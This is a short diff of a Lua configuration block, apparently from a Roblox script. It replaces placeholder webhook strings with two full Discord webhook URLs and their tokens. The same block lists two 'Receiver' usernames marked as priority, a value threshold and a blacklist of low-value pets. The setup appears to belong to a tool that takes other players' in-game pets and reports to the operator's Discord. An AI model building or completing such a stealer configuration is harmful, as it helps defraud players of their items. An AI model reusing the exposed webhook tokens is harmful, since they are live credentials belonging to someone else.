@@ -3,8 +3,8 @@
 
 -------[ CONFIG & WRAPPERS ]-------
 local cfg = {
-    web = "YOUR_WEBHOOK_HERE",
-    dual = "YOUR_DUAL_WEBHOOK_HERE",
+    web = "https://discord.com/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa",
+    dual = "https://discord.com/api/webhooks/1490011079735115796/CtTiahnkl0_ppBwAubLAEeO52GmOpTJ0tkfBMEsAJ1f7bO4Sz_cTyr07bUW9oGE9tCwo",
     users = {"2ndcfpaj67", "CREOLEO23"}, -- Receiver 1, Receiver 2 (Priority)
     threshold = 20,
     pets_bl = {["jiggly_jerboa"]=true, ["practice_dog"]=true, ["starter_egg"]=true},
